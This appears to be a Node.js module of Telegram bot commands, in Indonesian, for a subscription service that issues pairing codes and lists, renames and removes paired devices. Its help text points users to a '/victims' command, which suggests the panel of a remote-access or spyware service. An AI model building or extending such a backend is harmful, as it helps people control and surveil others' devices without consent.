const main = require('../index');

function generatePairingCode() {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
}

// Generate Pairing Code
exports.generatePairingCode = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    const subQuery = `
      SELECT * FROM subscriptions
      WHERE telegram_id = ?
      AND status = 'approved'
      AND is_active = 1
      AND (
        type = 'lifetime'
        OR (type = 'manual' AND activated_at IS NOT NULL)
      )
      ORDER BY activated_at DESC
      LIMIT 1
    `;

    main.db.query(subQuery, [chatId], (err, subs) => {
      if (err) {
        console.error(err);
        return main.bot.sendMessage(chatId, "❌ Database error.");
      }

      if (subs.length === 0) {
        return main.bot.sendMessage(chatId, `
❌ Kamu belum punya subscription aktif!

Gunakan:
/sub → lihat paket
/buy → beli subscription
        `);
      }

      const subscription = subs[0];

      let maxDevices;
      if (subscription.type === 'lifetime' && subscription.users === 0) {
        maxDevices = Infinity;
      } else {
        maxDevices = parseInt(subscription.users);
      }

      const countQuery = `
        SELECT COUNT(*) AS total
        FROM devices
        WHERE subscription_id = ?
        AND status = 'active'
      `;

      main.db.query(countQuery, [subscription.id], (err2, countRes) => {
        if (err2) {
          console.error(err2);
          return main.bot.sendMessage(chatId, "❌ Error cek jumlah device.");
        }

        const pairedCount = countRes[0].total;

        if (pairedCount >= maxDevices) {
          return main.bot.sendMessage(chatId, `
❌ Batas device tercapai!

Aktif: ${pairedCount}/${maxDevices === Infinity ? 'unlimited' : maxDevices}

Gunakan:
/remove - Hapus device
          `);
        }

        const checkPairQuery = `
          SELECT * FROM pairing_codes
          WHERE telegram_id = ?
          AND expires_at > NOW()
          AND used = 0
          ORDER BY created_at DESC
          LIMIT 1
        `;

        main.db.query(checkPairQuery, [chatId], (err3, codes) => {
          if (err3) {
            console.error(err3);
            return main.bot.sendMessage(chatId, "❌ Error cek pairing code.");
          }

          if (codes.length > 0) {
            const code = codes[0].pairing_code;
            const exp = new Date(codes[0].expires_at);

            return main.bot.sendMessage(chatId, `
🔁 *Pairing Code Masih Aktif*

Kode: \`${code}\`
Berlaku sampai: ${exp.toLocaleString('id-ID')}

📱 Masukkan ke aplikasi kamu.
Slot: ${pairedCount}/${maxDevices === Infinity ? 'unlimited' : maxDevices}
            `, { parse_mode: "Markdown" });
          }

          const newCode = generatePairingCode();
          const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

          const insertQuery = `
            INSERT INTO pairing_codes
            (subscription_id, telegram_id, pairing_code, expires_at)
            VALUES (?, ?, ?, ?)
          `;

          main.db.query(insertQuery, [
            subscription.id,
            chatId,
            newCode,
            expiresAt
          ], (err4) => {
            if (err4) {
              console.error(err4);
              return main.bot.sendMessage(chatId, "❌ Gagal membuat pairing code.");
            }

            main.bot.sendMessage(chatId, `
✅ *Pairing Code Baru Dibuat!*

Kode: \`${newCode}\`
Berlaku: 10 menit

📱 Masukkan ke aplikasi kamu.
Slot: ${pairedCount}/${maxDevices === Infinity ? 'unlimited' : maxDevices}
            `, { parse_mode: "Markdown" });
          });
        });
      });
    });
  });
};

// List All Devices
exports.listDevices = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    const query = `
      SELECT d.*, s.type, s.users 
      FROM devices d
      JOIN subscriptions s ON d.subscription_id = s.id
      WHERE d.telegram_id = ? AND d.status = 'active'
      ORDER BY d.paired_at DESC
    `;

    main.db.query(query, [chatId], (err, results) => {
      if (err) return main.bot.sendMessage(chatId, "Error database!");
      
      if (results.length === 0) {
        return main.bot.sendMessage(chatId, "Belum ada device yang terpair!");
      }

      let message = "📱 *Device yang terpair:*\n\n";
      results.forEach((device, index) => {
        const deviceName = device.device_name || `Device ${device.device_id.substring(0, 8)}`;
        message += `${index + 1}. *${deviceName}*\n`;
        message += `   ID: \`${device.device_id}\`\n`;
        message += `   Paired: ${new Date(device.paired_at).toLocaleString('id-ID')}\n`;
        message += `   Last active: ${device.last_active ? new Date(device.last_active).toLocaleString('id-ID') : 'Never'}\n\n`;
      });

      message += '\n💡 Tips:\n';
      message += '/rename - Ubah nama device\n';
      message += '/remove - Hapus device\n';
      message += '/victims - Lihat device online';

      main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
    });
  });
};

// Rename Device
exports.renameDevice = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    // Get list of devices
    const query = `
      SELECT device_id, device_name 
      FROM devices
      WHERE telegram_id = ? AND status = 'active'
      ORDER BY paired_at DESC
    `;

    main.db.query(query, [chatId], (err, results) => {
      if (err) return main.bot.sendMessage(chatId, "Error database!");
      
      if (results.length === 0) {
        return main.bot.sendMessage(chatId, "Belum ada device yang terpair!");
      }

      let message = "📝 *Pilih device yang ingin diubah namanya:*\n\n";
      results.forEach((device, index) => {
        const deviceName = device.device_name || `Device ${device.device_id.substring(0, 8)}`;
        message += `${index + 1}. ${deviceName}\n`;
        message += `   ID: \`${device.device_id}\`\n\n`;
      });
      message += '\nBalas dengan format:\ndevice_id,nama_baru\n\nContoh:\n`abc123def,HP Samsung Saya`';

      main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

      main.bot.once('message', (response) => {
        const text = response.text;
        const parts = text.split(',');

        if (parts.length !== 2) {
          return main.bot.sendMessage(chatId, "Format salah! Gunakan: device_id,nama_baru");
        }

        const [deviceId, newName] = parts.map(p => p.trim());

        // Verify ownership
        main.db.query(
          "SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = 'active'",
          [deviceId, chatId],
          (err2, devices) => {
            if (err2) return main.bot.sendMessage(chatId, "Error database!");
            if (devices.length === 0) {
              return main.bot.sendMessage(chatId, "❌ Device tidak ditemukan atau bukan milik kamu!");
            }

            // Update name
            main.db.query(
              "UPDATE devices SET device_name = ? WHERE device_id = ?",
              [newName, deviceId],
              (err3) => {
                if (err3) return main.bot.sendMessage(chatId, "Gagal mengubah nama!");
                
                main.bot.sendMessage(chatId, `
✅ *Nama device berhasil diubah!*

Device ID: \`${deviceId}\`
Nama baru: *${newName}*
                `, { parse_mode: "Markdown" });
              }
            );
          }
        );
      });
    });
  });
};

// Remove Device
exports.removeDevice = (msg) => {
  const chatId = msg.chat.id;

  main.requireAuth(chatId, (isAuth, errorMsg, user) => {
    if (!isAuth) {
      return main.bot.sendMessage(chatId, errorMsg);
    }

    // Get list of devices
    const query = `
      SELECT device_id, device_name 
      FROM devices
      WHERE telegram_id = ? AND status = 'active'
      ORDER BY paired_at DESC
    `;

    main.db.query(query, [chatId], (err, results) => {
      if (err) return main.bot.sendMessage(chatId, "Error database!");
      
      if (results.length === 0) {
        return main.bot.sendMessage(chatId, "Belum ada device yang terpair!");
      }

      let message = "🗑️ *Pilih device yang ingin dihapus:*\n\n";
      results.forEach((device, index) => {
        const deviceName = device.device_name || `Device ${device.device_id.substring(0, 8)}`;
        message += `${index + 1}. ${deviceName}\n`;
        message += `   ID: \`${device.device_id}\`\n\n`;
      });
      message += '\n⚠️ Balas dengan device_id untuk menghapus.\nContoh: `abc123def`';

      main.bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

      main.bot.once('message', (response) => {
        const deviceId = response.text.trim();

        // Verify ownership
        main.db.query(
          "SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = 'active'",
          [deviceId, chatId],
          (err2, devices) => {
            if (err2) return main.bot.sendMessage(chatId, "Error database!");
            if (devices.length === 0) {
              return main.bot.sendMessage(chatId, "❌ Device tidak ditemukan atau bukan milik kamu!");
            }

            const deviceName = devices[0].device_name || `Device ${deviceId.substring(0, 8)}`;

            // Update status to inactive
            main.db.query(
              "UPDATE devices SET status = 'inactive' WHERE device_id = ?",
              [deviceId],
              (err3) => {
                if (err3) return main.bot.sendMessage(chatId, "Gagal menghapus device!");
                
                main.bot.sendMessage(chatId, `
✅ *Device berhasil dihapus!*

Device: *${deviceName}*
ID: \`${deviceId}\`

Device ini tidak akan bisa terhubung lagi.
Gunakan /pair untuk menambah device baru.
                `, { parse_mode: "Markdown" });
              }
            );
          }
        );
      });
    });
  });
};